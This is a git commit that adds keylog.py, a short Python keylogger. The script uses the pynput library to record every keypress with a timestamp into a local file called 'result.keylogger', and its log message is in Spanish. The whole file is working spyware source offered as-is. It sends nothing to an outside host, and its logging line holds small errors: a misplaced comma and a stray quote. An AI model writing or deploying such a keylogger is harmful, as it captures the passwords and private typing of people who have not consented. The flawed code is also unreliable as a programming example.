ede37fbd2965ddc78880d3b0e36cc088fdeb6f7c
Julian-Enable <elabc80@gmail.com>
2023-09-19 21:45:59 -0500

    Initial commit

---
+++ keylog.py
@@ -0,0 +1,11 @@
+from pynput.keyboard import Listener
+import logging
+
+logging.basicConfig(filename='result.keylogger', level=logging.DEBUG, format="%(asctime)s: %(message)s'")
+
+def keystroke(key):
+
+    logging.info("se ha pulsado la tecla: {0}",format(key))
+
+with Listener(on_press=keystroke) as input_keyboard:
+    input_keyboard.join()
